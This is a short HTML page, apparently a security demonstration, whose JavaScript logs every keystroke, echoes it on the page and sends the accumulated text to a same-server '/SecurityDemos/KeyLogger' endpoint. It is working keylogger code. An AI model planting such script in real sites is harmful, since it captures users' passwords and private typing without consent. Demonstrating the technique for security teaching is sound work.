<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <title>TODO supply a title</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <script>
    var word = "";        
    window.onkeyup = function (e) {
              document.getElementById("out").innerHTML = document.getElementById("out").innerHTML + e.key;
              var xmlhttp = new XMLHttpRequest();
              var url = "/SecurityDemos/KeyLogger";
              word = word + e.key;
              var params = "word=" + encodeURIComponent(word)+"&keyPress=" + encodeURIComponent(e.key);
              url = url + "?" + params;
              xmlhttp.open("GET", url, true);

              xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

              xmlhttp.onreadystatechange = function () {
                if (xmlhttp.readyState == 4) {
                  if (xmlhttp.status == 200) {
                    
                  }
                }
              };
              xmlhttp.send(params);

            }
        </script>
        <div id="out"></div>
    </body>
</html>
